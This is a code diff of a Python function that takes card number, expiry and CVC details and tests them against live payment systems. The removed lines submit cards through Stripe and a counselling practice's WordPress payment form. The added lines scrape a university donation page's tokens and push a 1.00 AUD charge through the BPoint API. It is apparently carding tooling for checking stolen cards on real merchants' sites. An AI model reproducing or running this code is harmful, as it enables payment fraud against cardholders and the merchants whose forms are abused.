@@ -13,80 +13,161 @@ def Tele(ccx):
 		yy = yy.split("20")[1]
 	r = requests.session()
 
-	url = "https://api.stripe.com/v1/payment_methods"
-	
-	payload = {
-	  'type': "card",
-	  'card[number]': f"{n}",
-	  'card[cvc]': f"{cvc}",
-	  'card[exp_month]': f"{mm}",
-	  'card[exp_year]': f"{yy}",
-	  'payment_user_agent': "stripe.js/b2e402148c; stripe-js-v3/b2e402148c; card-element",
-	  'key': "pk_live_51GTo7cBVMPeY2b3ErXry9SNWZIENLLa09N6bxm8lVODmDv0zb6q6gbGUMAHBpLJTHapGhUws5u7aphFV8kz7zPY500NSjbv9zQ",
+	headers = {
+	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Cache-Control': 'max-age=0',
+	    'Connection': 'keep-alive',
+	    'Referer': 'https://www.google.com/',
+	    'Sec-Fetch-Dest': 'document',
+	    'Sec-Fetch-Mode': 'navigate',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'Sec-Fetch-User': '?1',
+	    'Upgrade-Insecure-Requests': '1',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
 	}
+	
+	response = session.get('https://www.stleos.uq.edu.au/make-a-payment-bpoint/', headers=headers)
+	
+	authorization = re.search(r'"authorization":"(.*?)"', response.text).group(1)
+	#print(authorization)
+	billerCode = re.search(r'name="billerCode" value="(.*?)"', response.text).group(1)
+	#print(billerCode)
 	
 	headers = {
-	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
-	  'Accept': "application/json",
-	  'authority': "api.stripe.com",
-	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
-	  'origin': "https://js.stripe.com",
-	  'referer': "https://js.stripe.com/",
-	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
-	  'sec-ch-ua-mobile': "?1",
-	  'sec-ch-ua-platform': "\"Android\"",
-	  'sec-fetch-dest': "empty",
-	  'sec-fetch-mode': "cors",
-	  'sec-fetch-site': "same-site"
+	    'Accept': '*/*',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Authorization': f'{authorization}',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/json',
+	    'Origin': 'https://www.stleos.uq.edu.au',
+	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
 	}
 	
-	response = requests.post(url, data=payload, headers=headers)
+	response = session.post('https://www.bpoint.com.au/rest/v5/txns/authkeys', headers=headers)
 	
-	pm = response.json()['id']
-	
-	url = "https://www.horizonscounseling.com/wp-admin/admin-ajax.php"
-	
-	payload = {
-	  'wpforms[fields][0]': 'Rodam User',
-	  'wpforms[fields][8]': '',
-	  'wpforms[fields][1]': 'rodamuser08@gmail.com',
-	  'wpforms[fields][2]': '(430) 300-0850',
-	  'wpforms[fields][11]': '1.00',
-	  'wpforms[stripe-credit-card-cardname]': 'Dao Khao Saard',
-	  'wpforms[hp]': '',
-	  'wpforms[id]': '1853',
-	  'page_title': 'Make a Payment',
-	  'page_url': 'https://www.horizonscounseling.com/make-a-payment/',
-	  'page_id': '1668',
-	  'wpforms[post_id]': '1668',
-	  'wpforms[payment_method_id]': f'{pm}',
-	  'wpforms[token]': 'bb798db94b5fc0fe4a287988667d32c1',
-	  'action': 'wpforms_submit',
-	  'start_timestamp': '1748333545524',
-	  'end_timestamp': '1748333583925'
-	}
+	authkey = response.json()['authkey']
+	#print(authkey)
 	
 	headers = {
-	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
-	  'Accept': "application/json, text/javascript, */*; q=0.01",
-	  'authority': "www.horizonscounseling.com",
-	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
-	  'origin': "https://www.horizonscounseling.com",
-	  'referer': "https://www.horizonscounseling.com/make-a-payment/",
-	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
-	  'sec-ch-ua-mobile': "?1",
-	  'sec-ch-ua-platform': "\"Android\"",
-	  'sec-fetch-dest': "empty",
-	  'sec-fetch-mode': "cors",
-	  'sec-fetch-site': "same-origin",
-	  'x-requested-with': "XMLHttpRequest"
+	    'Accept': '*/*',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Authorization': f'{authorization}',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/json',
+	    'Origin': 'https://www.stleos.uq.edu.au',
+	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
 	}
 	
-	response = session.post(url, data=payload, headers=headers)
+	json_data = {
+	    'action': 'Payment',
+	    'type': 'ECommerce',
+	    'subType': 'Single',
+	    'amount': 100,
+	    'billerCode': f'{billerCode}',
+	    'crn1': '1',
+	    'crn2': '',
+	    'crn3': '',
+	    'merchantReference': '',
+	    'currency': 'AUD',
+	    'bypass3ds': False,
+	    'tokenisationMode': 'Default',
+	    'emailAddress': '',
+	    'storeCard': True,
+	    'testMode': False,
+	}
 	
-	try:
-		result = re.search(r'<p>(.*?)<\\/p>', response.text).group(1)
-	except:
-		result = response.text
+	response = session.put(
+	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/txn-details',
+	    headers=headers,
+	    json=json_data,
+	)
 	
+	headers = {
+	    'Accept': '*/*',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Connection': 'keep-alive',
+	    'Content-type': 'application/json',
+	    'Origin': 'https://www.stleos.uq.edu.au',
+	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	
+	json_data = {
+	    'card': {
+	        'number': n,
+	        'expiry': {
+	            'month': f'{mm}',
+	            'year': yy,
+	        },
+	        'name': 'Dao Khao Saard',
+	        'cvn': f'{cvc}',
+	    },
+	}
+	
+	response = session.put(
+	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/client/payment-method',
+	    headers=headers,
+	    json=json_data,
+	)
+	
+	headers = {
+	    'Accept': '*/*',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Authorization': f'{authorization}',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/json',
+	    'Origin': 'https://www.stleos.uq.edu.au',
+	    'Referer': 'https://www.stleos.uq.edu.au/make-a-payment-bpoint/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	
+	json_data = {
+	    'webhook': {
+	        'url': 'https://stleo.wtdevsite.com/make-a-payment-bpoint/',
+	        'version': '5',
+	    },
+	    'surcharge': {
+	        'calculate': False,
+	        'amount': 0,
+	    },
+	    'updateToken': True,
+	}
+	
+	response = session.post(
+	    f'https://www.bpoint.com.au/rest/v5/txns/authkeys/{authkey}/process',
+	    headers=headers,
+	    json=json_data,
+	)
+	
+	result = re.search(r'"responseText":"(.*?)"', response.text).group(1)
 	return (result)
